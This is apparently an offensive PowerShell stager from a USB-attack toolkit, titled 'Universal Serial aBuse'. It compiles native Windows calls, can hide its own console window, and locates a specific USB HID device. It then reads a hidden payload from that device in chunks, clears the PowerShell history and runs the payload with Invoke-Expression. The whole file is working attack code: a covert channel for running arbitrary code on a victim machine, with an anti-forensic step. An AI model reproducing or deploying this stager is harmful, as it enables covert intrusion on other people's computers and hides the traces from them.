$ui = $Host.UI.RawUI
$ui.BackgroundColor = 'Black'
$ui.ForegroundColor = 'White'
$ui.WindowTitle = 'Universal Serial aBuse'
Clear

$M = 64
$cs = @"
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace n {
	public class w {
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
		[DllImport("user32.dll")]
		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

		public static FileStream o(string fn) {
			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
		}
	}
}
"@
Add-Type -TypeDefinition $cs
function stage() {
	[n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6) # change 6 to 0 to hide
	gwmi Win32_USBControllerDevice|%{[wmi]($_.Dependent)}|where-object{
		$_.GetPropertyValue("DeviceID") -match ("03EB&PID_2066") -and 
		($_.GetPropertyValue("Service") -eq $null)} | ForEach-Object {
		$fn = ("\??\" + $_.GetPropertyValue("DeviceID").ToString().Replace("\", "#") + "#{4d1e55b2-f16f-11cf-88cb-001111000030}")
	}
	$f = [n.w]::o($fn)
	$b = New-Object Byte[] ($M+1)
	$r = $f.Read($b, 0, $M+1)
	if ($b[1] -ge 2) {
		$e = ($b[2] * 256) + $b[3]
		$p = ""
		for ($i=4; $i -lt 2 + $b[1]; $i++) {
			$p += [char] $b[$i]
		}
		$g = $b[1]-2
		while ($g -lt $e) {
			$r = $f.Read($b, 0, $M+1)
			for ($i=2; $i -lt2+ $b[1]; $i++) {
				$p += [char] $b[$i]
			}
			$g += $b[1]
		}
		Clear-History
		Invoke-Expression $p
	}
}
stage
Write-Output "Stage finished"
